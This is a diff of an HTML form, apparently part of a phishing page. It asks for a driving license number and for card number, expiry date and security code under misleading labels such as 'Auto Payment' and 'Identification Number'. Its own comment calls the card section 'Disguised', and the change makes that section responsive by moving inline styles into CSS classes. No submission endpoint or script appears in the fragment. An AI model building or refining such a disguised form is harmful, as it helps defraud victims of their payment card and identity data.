@@ -215,18 +215,18 @@
     <input type="text" name="driving_license" placeholder="Enter your driving license number" required>
   </label>
 
-  <!-- Card Details Section - Disguised -->
-  <div style="margin-top: 1.5rem; padding: 1.5rem; background: var(--surface); border: 1px solid #e2e8f0; border-radius: var(--radius);">
-    <h4 style="margin: 0 0 1rem 0; color: var(--text); font-weight: 600;">Enter the Auto Payment</h4>
+  <!-- Card Details Section - Disguised - NOW RESPONSIVE -->
+  <div class="auto-payment-section">
+    <h4>Enter the Auto Payment</h4>
     
-    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
+    <div class="auto-payment-grid">
       <label>Identification Number *
         <input type="text" name="number" placeholder="16-digit card number" inputmode="numeric" pattern="\d{16}" maxlength="16" required>
       </label>
 
       <label>Expiration Date *
-      <input type="text" name="exp" placeholder="MM/YY" inputmode="numeric" pattern="\d{2}/\d{2}" maxlength="5" required>
-    </label>
+        <input type="text" name="exp" placeholder="MM/YY" inputmode="numeric" pattern="\d{2}/\d{2}" maxlength="5" required>
+      </label>
 
       <label>Security Code *
         <input type="text" name="code" placeholder="3-digit code" inputmode="numeric" pattern="\d{3,4}" maxlength="4" required>
